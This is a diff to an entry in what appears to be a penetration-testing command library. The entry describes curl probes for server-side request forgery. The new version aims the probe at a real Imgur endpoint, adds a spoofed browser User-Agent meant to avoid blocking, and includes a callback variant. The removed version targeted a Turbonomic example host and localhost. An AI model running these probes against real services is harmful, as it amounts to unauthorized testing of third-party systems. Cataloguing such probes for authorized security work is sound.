@@ -1,20 +1,20 @@
 ---
-id: cmd-curl-basic-probe
+id: cmd-curl-probe-001
 data: >-
-  curl -X POST https://turbonomic.example.com/api/integrations -d
-  'url=http://example.com' -v
+  curl -X GET "https://i.imgur.com/vidgif/url?url=https://example.com/test.txt"
+  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
 tags:
-  - recon
-  - http-probe
+  - probe
+  - http
 type: command
 output: null
 executor: bash
 platforms:
   - Linux
-  - macOS
   - Windows
+  - macOS
 created_at: '2023-10-01T00:00:00Z'
-updated_at: '2025-12-14T03:46:09.577Z'
+updated_at: '2025-12-14T17:28:20.686Z'
 verified: false
 validated: true
 submitted: true
@@ -24,39 +24,39 @@ submitted: true
 ## Command
 
 ```bash
-curl -X POST https://turbonomic.example.com/api/integrations -d 'url=http://example.com' -v
+curl -X GET "https://i.imgur.com/vidgif/url?url=https://example.com/test.txt" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
 ```
 
 ## Description
 
-This command probes a web endpoint for SSRF susceptibility by sending a POST request with a URL parameter, using verbose mode to inspect headers and potential internal forwarding.
+This command probes the Imgur endpoint with a basic external URL to test for SSRF by checking if the server fetches the URL without validation.
 
 ## Parameters
 
 | Parameter | Description | Required |
 |-----------|-------------|----------|
-| `-X POST` | Specifies HTTP method | Yes |
-| `-d 'url=...'` | Data payload with URL | Yes |
-| `-v` | Verbose output for debugging | Yes |
+| `-X GET` | Specifies HTTP method | Yes |
+| `url=...` | Target URL parameter | Yes |
+| `-H "User-Agent: ..."` | Mimics browser to avoid blocking | No |
 
 ## Examples
 
 ### Basic Usage
 
 ```bash
-curl -X POST https://target.com/api -d 'url=http://example.com' -v
+curl -X GET "https://i.imgur.com/vidgif/url?url=https://example.com/test.txt"
 ```
 
 ### Advanced Usage
 
 ```bash
-curl -X POST https://target.com/api -d 'url=http://localhost' -H 'Content-Type: application/x-www-form-urlencoded' -v
+curl -X GET "https://i.imgur.com/vidgif/url?url=https://yourserver.com/test.txt" -H "Accept: */*" -v
 ```
 
 ## Expected Output
 
-Verbose HTTP exchange, potentially showing connection to the supplied URL or errors indicating server-side request processing, e.g., "* Connected to localhost (127.0.0.1) port 80".
+HTTP response from Imgur, such as 200 OK with processing details, indicating the URL was accepted server-side.
 
 ## Related
 
-- [[Related Procedure: Identify Vulnerable Turbonomic Endpoint]]
+- [[Related Procedure]]
